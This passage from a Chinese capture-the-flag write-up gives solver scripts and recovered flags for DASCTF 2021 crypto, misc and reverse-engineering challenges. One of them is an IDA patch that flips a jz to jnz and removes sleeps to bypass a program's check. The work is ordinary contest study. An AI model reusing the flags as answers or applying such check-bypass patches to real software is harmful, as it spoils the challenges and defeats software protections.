solve<span class="token punctuation">(</span><span class="token number">2021</span><span class="token operator">*</span>p<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">2022</span> <span class="token operator">+</span> <span class="token number">2023</span><span class="token operator">*</span>p<span class="token operator">**</span><span class="token number">4</span> <span class="token operator">-</span> a<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token comment"># 用时1-2秒</span><span class="token keyword">assert</span> a <span class="token operator">==</span> <span class="token number">2021</span><span class="token operator">*</span>p<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">2022</span> <span class="token operator">+</span> <span class="token number">2023</span><span class="token operator">*</span>p<span class="token operator">**</span><span class="token number">4</span>p <span class="token operator">=</span> <span class="token number">9849483964909942642702841079905240118177503474715624145847966507461420748914700088374273209071471481219849748116334914172343735036739076730486732571971497</span>hint1 <span class="token operator">=</span> <span class="token number">5721198034334676541837614694444858336798773246799126905170215130476545540224374062960340456885923620963383130312535476337226014394595162625328729352118817</span>c <span class="token operator">=</span> <span class="token number">70105679627771719775142746553136794250337998462106229956679264658530098746665466868944855488308669706231622476566195559705924155363353360283408488917464065710623926781621366649773018113928630700594350396854359790092271835687816435058239792764298042156558375596434224003013749584571959306678511753195214791439107077903813757339868710576521858061442786434257451730633431229846440096297272405246087428205202111469272496134202922842748813992627453559734564891714846769627501147879058486675487738815514505109515031476986129016953015076080656764571648130270143686579720157712521222948534007797015393032826637675765983480855079052044005355401993107282102074405371246891417816527026361635916312955134612786069557685941228464218624689513588345168398491708253400514386622804630997</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> hint1<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'flag&#123;24uz5n82476b3315k6m8rk333b37pa22&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>所以这里求dp除了<code>(invert(e, (p - 1) * (q - 1))) % (p-1)</code>之外，还有另一种方式，那就是<code>(invert(e, lcm(p - 1, q - 1))) % (p - 1)</code>，求得的也是dp。</p><h2 id="Misc-赛后补打完"><a href="#Misc-赛后补打完" class="headerlink" title="Misc (赛后补打完)"></a>Misc (赛后补打完)</h2><h3 id="Girlfriend’s-account"><a href="#Girlfriend’s-account" class="headerlink" title="Girlfriend’s account"></a>Girlfriend’s account</h3><pre class="line-numbers language-none"><code class="language-none">jackie的女朋友又偷偷用他的信用卡买东西了，你能算算一共花了多少钱吗？<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个xlsx文件分析，里面是数据需要转换，直接使用xlrd模块来提取数据再进行处理，其中金额大写转小写是我百度py的脚本，准确度也是很高的，下面是脚本的内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> xlrd<span class="token keyword">from</span> decimal <span class="token keyword">import</span> Decimal<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">transform</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    摘自: https://blog.csdn.net/farewellnec/article/details/103686077    """</span>    chinese_num <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'零'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'壹'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'贰'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'叁'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'肆'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'伍'</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'陆'</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'柒'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'捌'</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'玖'</span><span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">&#125;</span>    chinese_amount <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'分'</span><span class="token punctuation">:</span> <span class="token number">0.01</span><span class="token punctuation">,</span> <span class="token string">'角'</span><span class="token punctuation">:</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token string">'元'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'拾'</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">'佰'</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">'仟'</span><span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token string">'圆'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>    amount_float <span class="token operator">=</span> <span class="token number">0</span>    amount_yuan <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> chinese_amount<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> amount<span class="token punctuation">:</span>            <span class="token keyword">if</span> amount<span class="token punctuation">[</span>amount<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> chinese_num<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                amount_yuan <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>amount<span class="token punctuation">[</span>amount<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> chinese_amount<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    amount_float <span class="token operator">+=</span> amount_yuan    <span class="token keyword">return</span> amount_float<span class="token keyword">def</span> <span class="token function">transform2</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    chinese_num <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'零'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'壹'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'贰'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'叁'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'肆'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'伍'</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'陆'</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'柒'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'捌'</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'玖'</span><span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> chinese_num<span class="token punctuation">[</span>num<span class="token punctuation">]</span>excel <span class="token operator">=</span> xlrd<span class="token punctuation">.</span>open_workbook<span class="token punctuation">(</span><span class="token string">'Misc-Girlfriends_account-.xlsx'</span><span class="token punctuation">)</span>sheet <span class="token operator">=</span> excel<span class="token punctuation">.</span>sheet_by_index<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>data1 <span class="token operator">=</span> sheet<span class="token punctuation">.</span>col_values<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>data2 <span class="token operator">=</span> sheet<span class="token punctuation">.</span>col_values<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>total <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp1 <span class="token operator">=</span> <span class="token builtin">round</span><span class="token punctuation">(</span>transform<span class="token punctuation">(</span>data1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>    tmp2 <span class="token operator">=</span> transform2<span class="token punctuation">(</span>data2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    total <span class="token operator">+=</span> Decimal<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> Decimal<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>tmp2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span><span class="token comment"># 12305926.36</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="双目失明，身残志坚"><a href="#双目失明，身残志坚" class="headerlink" title="双目失明，身残志坚"></a>双目失明，身残志坚</h3><p>先使用盲水印获得图片</p><pre class="line-numbers language-none"><code class="language-none">python .\bwmforpy3.py decode .\original.png .\blind.png flag.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/image-20210927091939797.png" alt></p><p>然后是盲文加密。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/image-20210927130130108.png" alt="盲文加密对照表"></p><p>搞错了不是这个，是【<strong>盲文拼音加密表</strong>】，我真服了。。。</p><p>关于拼音，有下面的<a href="https://blog.csdn.net/weixin_30785593/article/details/96365878">这篇博客</a>内有介绍。只能写出下面的这个</p><pre class="line-numbers language-none"><code class="language-none">zh e j iang g ong ie d a x ue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>应该是</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;zhejianggongyedaxue&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ZipBomb"><a href="#ZipBomb" class="headerlink" title="ZipBomb"></a>ZipBomb</h3><p>没做出来，赛后抄的雪殇姐姐的脚本做出来的。雪殇姐姐的脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">.</span>path<span class="token keyword">import</span> zipfile<span class="token keyword">import</span> redir_path<span class="token operator">=</span><span class="token string">'C:\\Users\\Snowywar\\Desktop\\zipBomb'</span>files<span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>dir_path<span class="token punctuation">)</span>newfiles <span class="token operator">=</span> files<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>newfiles<span class="token punctuation">)</span>setee <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> newfiles<span class="token punctuation">:</span> <span class="token comment">#遍历文件夹</span>    position <span class="token operator">=</span> dir_path<span class="token operator">+</span><span class="token string">'\\'</span><span class="token operator">+</span> <span class="token builtin">file</span> <span class="token comment">#构造绝对路径，"\\"，其中一个'\'为转义符</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span>position<span class="token punctuation">)</span>               z <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>position<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> filename <span class="token keyword">in</span> z<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">bytes</span> <span class="token operator">=</span> z<span class="token punctuation">.</span>read<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b'Zmxh'</span> <span class="token keyword">in</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>还没思路，有空再看</strong></p><h2 id="Reverse-赛后补打完"><a href="#Reverse-赛后补打完" class="headerlink" title="Reverse (赛后补打完)"></a>Reverse (赛后补打完)</h2><h3 id="ea5ycpp"><a href="#ea5ycpp" class="headerlink" title="ea5ycpp"></a>ea5ycpp</h3><p>这个题网上搜的wp上面说利用ida动态调试比较简单，但是我ida的动态调试还是不太熟，emmm，直接带上STL标准库一起分析就行了。其实稍微分析一下他的给出的数据就知道了，前面给的四个字符为<code>hoel</code>，写个脚本看看规律</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">byte <span class="token operator">=</span> <span class="token string">'hoel'</span>flag <span class="token operator">=</span> <span class="token string">'flag'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>byte<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/image-20210927190350005.png" alt></p><p>七分逆向三分猜，忙碌了一天的我再次开始猜了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">byte <span class="token operator">=</span> <span class="token string">'hoel\x81iz=;yks89&#123;p&#123;Hs|\x85G|\x96'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>byte<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;br41n_f**k_i5_go0d&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h3><p>简单的数学问题，直接用sympy库给解了，首先打开ida加载程序，找到关键函数的位置处。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">sub_411FA5</span><span class="token punctuation">(</span><span class="token number">0x10u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4121D5</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> v11<span class="token punctuation">)</span><span class="token punctuation">;</span>  v32 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">sub_41257C</span><span class="token punctuation">(</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"Input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> sub_412572<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>    v19 <span class="token operator">=</span> std<span class="token operator">::</span>istream<span class="token operator">::</span>operator<span class="token operator">>></span><span class="token punctuation">(</span>std<span class="token operator">::</span>cin<span class="token punctuation">,</span> v30<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>std<span class="token operator">::</span>ios_base<span class="token operator">::</span>operator <span class="token function">bool</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v19 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> v19<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token function">sub_4121B7</span><span class="token punctuation">(</span>v30<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">sub_411F28</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">5</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  v29 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_411F4B</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v28 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_411F4B</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v27 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_411F4B</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v26 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_411F4B</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token string">'flagU'</span><span class="token punctuation">;</span>  v25 <span class="token operator">=</span> <span class="token function">sub_41218F</span><span class="token punctuation">(</span>v26<span class="token punctuation">,</span> <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v26<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_411F28</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">5</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v29 <span class="token operator">-</span> v25 <span class="token operator">==</span> <span class="token number">0x61536369217D</span>i64 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v28 <span class="token operator">-</span> v25 <span class="token operator">==</span> <span class="token number">0x586531316F</span>i64 <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v27 <span class="token operator">-</span> v25 <span class="token operator">==</span> <span class="token number">0x5F3631626F4E</span>i64 <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v25 <span class="token operator">+</span> v27 <span class="token operator">+</span> v28 <span class="token operator">+</span> v29 <span class="token operator">==</span> <span class="token number">0xC121F9FCC23A</span>i64 <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You are right!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">//.............................</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里面给了几个数学公式，猜测将公式解出来即可得到flag，此处使用sympy脚本来解，脚本如下所示</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> sympyv25<span class="token punctuation">,</span> v27<span class="token punctuation">,</span> v28<span class="token punctuation">,</span> v29 <span class="token operator">=</span> sympy<span class="token punctuation">.</span>symbols<span class="token punctuation">(</span><span class="token string">"v25 v27 v28 v29"</span><span class="token punctuation">)</span>res <span class="token operator">=</span> sympy<span class="token punctuation">.</span>solve<span class="token punctuation">(</span>    <span class="token punctuation">[</span>v29 <span class="token operator">-</span> v25 <span class="token operator">-</span> <span class="token number">0x61536369217D</span><span class="token punctuation">,</span> v28 <span class="token operator">-</span> v25 <span class="token operator">-</span> <span class="token number">0x586531316F</span><span class="token punctuation">,</span> v27 <span class="token operator">-</span> v25 <span class="token operator">-</span> <span class="token number">0x5F3631626F4E</span><span class="token punctuation">,</span> v25 <span class="token operator">+</span> v27 <span class="token operator">+</span> v28 <span class="token operator">+</span> v29 <span class="token operator">-</span> <span class="token number">0xC121F9FCC23A</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span>v25<span class="token punctuation">,</span> v27<span class="token punctuation">,</span> v28<span class="token punctuation">,</span> v29<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""b'\x10\x00\x00\x00\x00'b'_F1boN'b'he11o'b'acci!&#125;'"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>故flag为</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;he11o_F1boNacci!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="pig-brain-king"><a href="#pig-brain-king" class="headerlink" title="pig_brain_king"></a>pig_brain_king</h3><p>这题需要使用ida修改硬件编码来解决问题，首先就是一个程序逻辑的分析，这里有个判断的指令，估计接下来还有个跳转的指令，这里需要我们无论输入什么都给判断为正确即可，看看伪代码</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/image-20210928150837849.png" alt></p><p>注意到这里有一个判断，下面必然对应着有一个跳转的汇编指令，直接TAB跳转到汇编指令界面，对这条汇编的硬编码进行一个修改。本来那里是jz指令，改为jnz指令即可。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/image-20210928151105515.png" alt></p><p><strong>注：修改硬编码的方式为，首先Options -&gt; General</strong>作如下改动</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/image-20210928165406139.png" alt></p><p><strong>将0改为16，然后找到要修改的汇编代码，在左边找到对应的十六进制编码，改一下对应的byte值就行了</strong></p><p>也可直接修改汇编代码，总之所有修改代码的地方就是<strong>Edit -&gt; patch program子选项下</strong>改完之后再在此子选项下Apply一下即可。</p><p>这里先把跳转那里改了，我们需要的是即使我们输入的不对也会被逻辑判断为对，差不多就是这么个意思。</p><p>我这里第一次改的没生效，再改了一次并截了个图。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/image-20210928170800541.png" alt></p><p>注意是更改541行伪代码那里的if对应的跳转汇编指令，此处更改之后再次运行exe会发现我们输入的错误的会被判定为对，此时因为有1000层判断，这里我们直接开挂修改初始值</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/image-20210928171427822.png" alt></p><p>将上面的3修改为1000试试。。。</p><p>emmm，好像不行，那这里的判断获取flag的条件应该就不是这个v280的数值。</p><p>那就直接不考虑这个麻烦的了，直接将sleep的那里的push汇编代码修改为0好眠即可跳过睡眠。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/image-20210928172120279.png" alt></p><p>emmm，所以这个程序所有改动只有四处</p><pre class="line-numbers language-none"><code class="language-none">三处sleep的时间修改为0毫秒一处 jz指令 修改为 jnz指令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后再在记事本里面搞出来1000行东西，可以是1000个a，但是必须要有换行符。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/image-20210928174425915.png" alt></p><p>我可以作证，到这真的有flag了。。。但是被<em>号给遮住了，这里要把`</em>号`修改为0。</p><p>找了半天发现”*”符号出现在下面这个函数里面</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/image-20210928175233691.png" alt></p><hr><p>emmm，好像要修改前面声明的地方，需要直接双击字符即可跳转。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/image-20210928180530048.png" alt></p><p>最终运行如下所示。</p><p><img 